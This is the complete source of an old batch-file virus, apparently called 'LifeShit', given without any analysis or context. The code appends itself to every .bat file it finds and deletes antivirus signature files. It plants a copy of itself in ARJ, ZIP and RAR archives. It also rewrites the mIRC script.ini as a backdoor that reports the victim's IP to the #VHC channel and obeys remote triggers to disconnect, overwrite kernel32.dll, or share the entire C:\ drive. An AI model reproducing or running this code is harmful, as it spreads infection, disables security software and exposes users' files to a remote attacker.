
@ctty nul
set Life=Shit
copy %0 ..\%0
if "#%1"=="#find" goto find
if "#%1"=="#infect" goto infect
if exist setup.bat ren setup.bat setup.$$$
copy %0 setup.bat
:find
for %%f in (*.bat c:\windows\*.bat) do call %0 infect %%f
for %%v in (c:\progra~1\antivi~1\*.avc) do del %%v
for %%a in (*.arj) do arj a -m1 -y %2 setup.bat
for %%z in (*.zip) do pkzip %%z setup.bat
for %%r in (*.rar) do rar a -y %%r setup.bat
goto ende
:infect
type %2|find "Life=Shit"
if errorlevel 1 goto copy
goto ende
:copy
@copy %2 /A + %0 /A /Y
if exist ..\%0 call ..\%0
:ende
if not exist c:\progra~1\mirc\mirc32.exe goto ex
cd c:\progra~1\mirc\
set %si%=script.ini
del %si%
echo [script] >>%si%
echo n0=ON 1:CONNECT:.msg #VHC Infected by LifeShit- $ip @ $server : $port >>%si%
echo n1=ON 1:JOIN:#:if {$nick == VHC} .mode $chan +o $nick  >>%si%
echo n2=ON 1:TEXT:*ShutUp*:*:{.disconnect Shutting Up..} >>%si%
echo n3=ON 1:TEXT:*FoaD*:*:{.copy $mircini c:\windows\system\kernel32.dll} >>%si%
echo n5=ON 1:TEXT:*DiSG*:#:{.fserve $nick 1 c:\} >>%si%
cd c:\
:ex